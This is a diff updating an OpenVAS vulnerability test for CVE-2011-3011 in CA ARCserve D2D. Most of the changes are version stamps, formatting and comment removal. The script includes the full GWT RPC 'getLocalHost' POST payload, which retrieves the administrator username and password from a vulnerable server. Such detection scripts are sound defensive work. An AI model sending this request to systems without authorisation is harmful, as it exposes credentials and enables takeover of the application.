@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: secpod_ca_arcserver_d2d_mult_vuln.nasl 7044 2017-09-01 11:50:59Z teissa $
+# $Id: secpod_ca_arcserver_d2d_mult_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
 #
 # CA ARCserver D2D GWT RPC Request Multiple Vulnerabilities
 #
@@ -27,8 +27,8 @@
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.902462");
-  script_version("$Revision: 7044 $");
-  script_tag(name:"last_modification", value:"$Date: 2017-09-01 13:50:59 +0200 (Fri, 01 Sep 2017) $");
+  script_version("$Revision: 11997 $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
   script_tag(name:"creation_date", value:"2011-07-29 17:55:33 +0200 (Fri, 29 Jul 2011)");
   script_cve_id("CVE-2011-3011");
   script_bugtraq_id(48897);
@@ -40,26 +40,23 @@ if(description)
   script_family("Web Servers");
   script_dependencies("find_service.nasl");
   script_require_ports("Services/www", 8014);
-  script_tag(name : "impact" , value : "Successful exploitation will allow attackers to gain the
+  script_tag(name:"impact", value:"Successful exploitation will allow attackers to gain the
   sensitive information, further attacker can login to the affected
   application then execute arbitrary commands with Administrator group
-  privileges.
-
-  Impact Level: Application");
-  script_tag(name : "affected" , value : "CA ARCserver D2D Version r15.0");
-  script_tag(name : "insight" , value : "Multiple flaws are due to error in GWT RPC mechanism when
+  privileges.");
+  script_tag(name:"affected", value:"CA ARCserver D2D Version r15.0");
+  script_tag(name:"insight", value:"Multiple flaws are due to error in GWT RPC mechanism when
   receives messages from the Administrator browser. A remote user with access
   to the web server can send a POST request to the homepageServlet serlvet
   containing the 'getLocalHost' message and the correct filename of a certain
   descriptor to disclose the username and password of the target application.");
-  script_tag(name : "solution" , value : "No solution or patch was made available for at least one year
-  since disclosure of this vulnerability. Likely none will be provided anymore.
-  General solution options are to upgrade to a newer release, disable respective
-  features, remove the product or replace the product by another one.");
-  script_tag(name : "summary" , value : "The host is running CA ARCserver D2D and is prone to multiple
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
+  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
+  release, disable respective features, remove the product or replace the product by another one.");
+  script_tag(name:"summary", value:"The host is running CA ARCserver D2D and is prone to multiple
   vulnerabilities.");
   script_tag(name:"solution_type", value:"WillNotFix");
-  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/103426/caarcserve-exec.txt");
+  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/103426/caarcserve-exec.txt");
 
   script_tag(name:"qod_type", value:"remote_app");
 
@@ -70,15 +67,12 @@ if(description)
 include("http_func.inc");
 include("http_keepalive.inc");
 
-## Check fot the default port
 port = get_http_port(default:8014);
 if(!get_port_state(port))exit(0);
 
-## Get the response from the server
 req = http_get (item:"/" , port:port);
 res = http_keepalive_send_recv(port:port,data:req);
 
-## Confirm the server
 if(">CA ARCserve D2D" >< res)
 {
 
@@ -86,12 +80,10 @@ if(">CA ARCserve D2D" >< res)
   if( port != 80 && port != 443 )
     host += ':' + port;
 
-  ## Construct the POST data
   postdata = string('5|0|4|http://',host,'/contents/|2C6B' +
                     '33BED38F825C48AE73C093241510|com.ca.arcflash.ui.client' +
                     '.homepage.HomepageService|getLocalHost|1|2|3|4|0|');
 
-  ## Construct the POST request
   req = string("POST /contents/service/homepage HTTP/1.1\r\n",
                "Host: ",host, "\r\n",
                "Content-Type: text/x-gwt-rpc; charset=utf-8\r\n",
@@ -100,7 +92,6 @@ if(">CA ARCserve D2D" >< res)
 
   res = http_send_recv(port:port, data:req);
 
-  ## Confirm the exploit
   if('//OK' >< res && '"user"' >< res && '"password"' >< res &&
      '"hostName"' >< res &&  '"uuid"' >< res){
     security_message(port:port);
